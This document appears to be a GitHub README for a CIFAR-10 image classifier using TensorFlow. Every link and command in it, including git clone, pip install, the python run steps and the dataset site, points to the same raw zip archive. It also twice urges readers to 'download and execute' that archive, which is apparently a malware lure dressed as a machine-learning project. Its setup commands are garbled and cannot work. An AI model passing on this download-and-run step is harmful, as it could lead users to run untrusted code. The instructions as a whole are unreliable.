# CIFAR-10 Image Classifier 🧠

![CIFAR-10 Image Classifier](https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip%20Image%20Classifier-TensorFlow-blue?style=for-the-badge)

Welcome to the **CIFAR-10 Image Classifier** repository! This project showcases deep learning techniques to classify images from the CIFAR-10 dataset using both Artificial Neural Networks (ANN) and Convolutional Neural Networks (CNN). The repository includes everything you need for model training, evaluation, and visualization of predictions.

[Download and execute the latest release here!](https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip)

## Table of Contents

- [Introduction](#introduction)
- [CIFAR-10 Dataset](#cifar-10-dataset)
- [Technologies Used](#technologies-used)
- [Installation](#installation)
- [Usage](#usage)
- [Training the Model](#training-the-model)
- [Evaluating the Model](#evaluating-the-model)
- [Visualizing Predictions](#visualizing-predictions)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Introduction

The CIFAR-10 dataset is a popular dataset in the field of machine learning and computer vision. It consists of 60,000 32x32 color images in 10 different classes, with 6,000 images per class. The classes include:

- Airplane
- Automobile
- Bird
- Cat
- Deer
- Dog
- Frog
- Horse
- Ship
- Truck

This project aims to build a robust image classifier using TensorFlow and Keras, employing both ANN and CNN architectures to compare their performance.

## CIFAR-10 Dataset

The CIFAR-10 dataset is widely used for benchmarking machine learning models. It provides a good balance of complexity and size, making it ideal for training models. You can download the dataset from the official [CIFAR-10 website](https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip~https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip).

### Dataset Structure

The dataset is divided into two parts:

- **Training set**: 50,000 images
- **Test set**: 10,000 images

Each image is labeled with one of the 10 classes mentioned above. The images are stored in binary format, and you can easily load them using libraries like TensorFlow or PyTorch.

## Technologies Used

This project utilizes the following technologies:

- **Python**: The primary programming language.
- **TensorFlow**: The deep learning framework used for building and training models.
- **Keras**: A high-level API for TensorFlow that simplifies model building.
- **NumPy**: For numerical operations and handling arrays.
- **Matplotlib**: For data visualization.
- **Pandas**: For data manipulation and analysis.

## Installation

To set up the project on your local machine, follow these steps:

1. **Clone the repository**:

   ```bash
   git clone https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip
   cd cifar10-image-classifier
   ```

2. **Install required packages**:

   You can install the required packages using pip. It is recommended to use a virtual environment.

   ```bash
   pip install -r https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip
   ```

3. **Download the CIFAR-10 dataset**:

   If you haven't downloaded the dataset yet, follow the instructions on the [CIFAR-10 website](https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip~https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip).

## Usage

Once you have installed the required packages and downloaded the dataset, you can start using the project.

### Running the Model

To train the model, run the following command:

```bash
python https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip
```

This will start the training process. You can monitor the training progress in the terminal.

### Evaluating the Model

To evaluate the trained model on the test set, run:

```bash
python https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip
```

This will output the accuracy and loss of the model on the test data.

### Visualizing Predictions

To visualize predictions made by the model, use:

```bash
python https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip
```

This will display some test images along with their predicted labels.

## Training the Model

### Model Architecture

The project includes both ANN and CNN architectures. 

#### Artificial Neural Network (ANN)

The ANN model consists of:

- Input layer
- One or more hidden layers with activation functions
- Output layer with softmax activation

The ANN model is simpler and may not perform as well on image data compared to CNNs.

#### Convolutional Neural Network (CNN)

The CNN model includes:

- Convolutional layers
- Pooling layers
- Fully connected layers

The CNN model is designed to capture spatial hierarchies in images, making it more suitable for image classification tasks.

### Training Process

The training process involves:

1. Loading the CIFAR-10 dataset.
2. Preprocessing the images (normalization, resizing).
3. Compiling the model.
4. Fitting the model to the training data.

You can customize hyperparameters such as learning rate, batch size, and number of epochs in the `https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip` file.

## Evaluating the Model

After training, it's essential to evaluate the model's performance on unseen data. The evaluation script computes metrics like accuracy and loss. You can also generate a confusion matrix to visualize classification performance across different classes.

## Visualizing Predictions

Visualizing predictions helps in understanding how well the model performs. The `https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip` script displays a selection of test images along with their predicted and actual labels. This can provide insights into areas where the model may struggle.

## Contributing

Contributions are welcome! If you want to improve this project, feel free to fork the repository and submit a pull request. Here are some ways you can contribute:

- Improve documentation
- Add new features
- Fix bugs
- Enhance model performance

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For any inquiries or suggestions, please reach out to me via GitHub or email.

[Download and execute the latest release here!](https://raw.githubusercontent.com/Zakstor15/cifar10-image-classifier/main/motionless/image_cifar_classifier_3.3.zip)

Check the "Releases" section for updates and new features.